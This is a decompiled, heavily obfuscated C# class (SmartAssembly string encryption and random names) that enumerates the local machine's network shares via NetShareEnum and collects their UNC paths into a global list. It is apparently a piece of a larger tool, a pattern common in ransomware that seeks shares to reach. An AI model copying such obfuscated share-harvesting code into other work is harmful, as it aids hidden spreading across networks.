using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace vlFwgXmbIo;

public sealed class mxUamsFWczRaf
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct kgJuXjuQKFK
	{
		public string IfiOnwrmAVOUpkk;

		public uint XmvUCGLktHsff;

		public string yZXZKYbSBuOm;

		public kgJuXjuQKFK(string string_0, uint uint_0, string string_1)
		{
			IfiOnwrmAVOUpkk = string_0;
			XmvUCGLktHsff = uint_0;
			yZXZKYbSBuOm = string_1;
		}

		public override string ToString()
		{
			return IfiOnwrmAVOUpkk;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	public kgJuXjuQKFK[] rkYFRVaAkjBfkD(string string_0)
	{
		List<kgJuXjuQKFK> list = new List<kgJuXjuQKFK>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(kgJuXjuQKFK));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				kgJuXjuQKFK item = (kgJuXjuQKFK)Marshal.PtrToStructure(ptr, typeof(kgJuXjuQKFK));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new kgJuXjuQKFK(getString_0(107402365) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static void pLiSneVfdnlz()
	{
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			kgJuXjuQKFK[] array = new mxUamsFWczRaf().rkYFRVaAkjBfkD(Environment.MachineName);
			kgJuXjuQKFK[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				kgJuXjuQKFK kgJuXjuQKFK = array2[i];
				if (kgJuXjuQKFK.ToString().Contains(getString_0(107402356)) || kgJuXjuQKFK.ToString().Contains(getString_0(107402379)) || kgJuXjuQKFK.ToString().Contains(getString_0(107402370)) || kgJuXjuQKFK.ToString().Contains(getString_0(107391028)) || logicalDrives.Contains(kgJuXjuQKFK.ToString().Replace(getString_0(107405609), getString_0(107402329))))
				{
					continue;
				}
				if (!RQEwPOshulKqs.FYgeyItMBgHKLJgZ.Contains(getString_0(107391079) + Environment.MachineName + getString_0(107397307) + kgJuXjuQKFK))
				{
					RQEwPOshulKqs.FYgeyItMBgHKLJgZ.Add(getString_0(107391079) + Environment.MachineName + getString_0(107397307) + kgJuXjuQKFK);
				}
				if (RQEwPOshulKqs.DcTmJYuRqmJcpcY)
				{
					try
					{
						Console.WriteLine(getString_0(107402324), getString_0(107391079) + Environment.MachineName + getString_0(107397307) + kgJuXjuQKFK);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (RQEwPOshulKqs.rcFXGcWApOJB)
			{
				try
				{
					File.AppendAllText(RQEwPOshulKqs.nPLbuhisBzmHoeaY, getString_0(107402299) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static mxUamsFWczRaf()
	{
		Strings.CreateGetStringDelegate(typeof(mxUamsFWczRaf));
	}
}
